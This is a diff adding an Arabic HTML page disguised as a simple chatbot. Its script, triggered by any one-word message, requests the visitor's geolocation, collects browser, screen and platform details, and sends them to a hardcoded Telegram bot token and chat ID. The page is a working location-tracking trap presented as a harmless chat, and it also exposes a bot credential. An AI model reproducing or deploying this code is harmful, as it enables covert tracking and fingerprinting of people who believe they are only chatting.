@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دردشة بسيطة</title>
+<style>
+    body { 
+        font-family: Arial, sans-serif; 
+        text-align: center; 
+        background-color: #f4f4f9;
+        margin: 0;
+        padding: 0;
+    }
+
+    .chat-box { 
+        width: 320px; 
+        margin: 50px auto; 
+        border: 2px solid #ccc; 
+        padding: 15px; 
+        border-radius: 10px; 
+        background: white; 
+        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .messages { 
+        height: 220px; 
+        overflow-y: auto; 
+        border-bottom: 2px solid #ddd; 
+        padding: 10px; 
+        text-align: right;
+        background: #fafafa; 
+        border-radius: 5px;
+    }
+
+    input { 
+        width: 75%; 
+        padding: 8px; 
+        border: 1px solid #ccc; 
+        border-radius: 5px; 
+        outline: none;
+        font-size: 14px;
+    }
+
+    button { 
+        padding: 8px 12px; 
+        background: #0078ff; 
+        color: white; 
+        border: none; 
+        border-radius: 5px; 
+        cursor: pointer;
+        transition: 0.3s;
+        font-size: 14px;
+    }
+
+    button:hover { 
+        background: #0056b3; 
+    }
+</style>
+</head>
+<body><div class="chat-box">
+    <div class="messages" id="messages"></div>
+    <input type="text" id="userInput" placeholder="اكتب رسالة...">
+    <button onclick="sendMessage()">إرسال</button>
+</div><script>
+    function sendMessage() {
+        let inputField = document.getElementById("userInput");
+        let message = inputField.value.trim();
+        if (!message) return;
+
+        let chatBox = document.getElementById("messages");
+        chatBox.innerHTML += `<div>أنت: ${message}</div>`;
+
+        if (message.split(" ").length === 1) {
+            chatBox.innerHTML += `<div>بوت: كيف حالك؟ كيف يمكنني مساعدتك؟</div>`;
+            requestLocation();
+        }
+
+        inputField.value = "";
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function requestLocation() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        } else {
+            alert("الموقع غير مدعوم في هذا المتصفح.");
+        }
+    }
+
+    function sendLocation(position) {
+        let latitude = position.coords.latitude;
+        let longitude = position.coords.longitude;
+        let browser = navigator.userAgent;
+        let screenSize = `${window.innerWidth}x${window.innerHeight}`;
+        let os = navigator.platform;
+
+        let data = `الموقع: (${latitude}, ${longitude})\nالمتصفح: ${browser}\nحجم الشاشة: ${screenSize}\nنظام التشغيل: ${os}`;
+        
+        document.getElementById("messages").innerHTML += `<div>بوت: تم الحصول على موقعك ومعلومات الجهاز!</div>`;
+        alert(data); // عرض البيانات للمستخدم قبل الإرسال
+
+        let botToken = "7784256617:AAHvkmPyy8eGJ7vfq5FS_-C3lJN42giTFbA"; // استبدله بتوكين البوت الخاص بك
+        let chatId = "7172098832"; // استبدله بمعرف الدردشة الخاص بك
+
+        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        let payload = {
+            chat_id: chatId,
+            text: data
+        };
+
+        fetch(telegramURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(response => response.json())
+        .then(data => console.log("تم الإرسال:", data))
+        .catch(error => console.error("خطأ في الإرسال:", error));
+    }
+
+    function showError(error) {
+        alert("فشل في الحصول على الموقع: " + error.message);
+    }
+</script></body>
+</html>
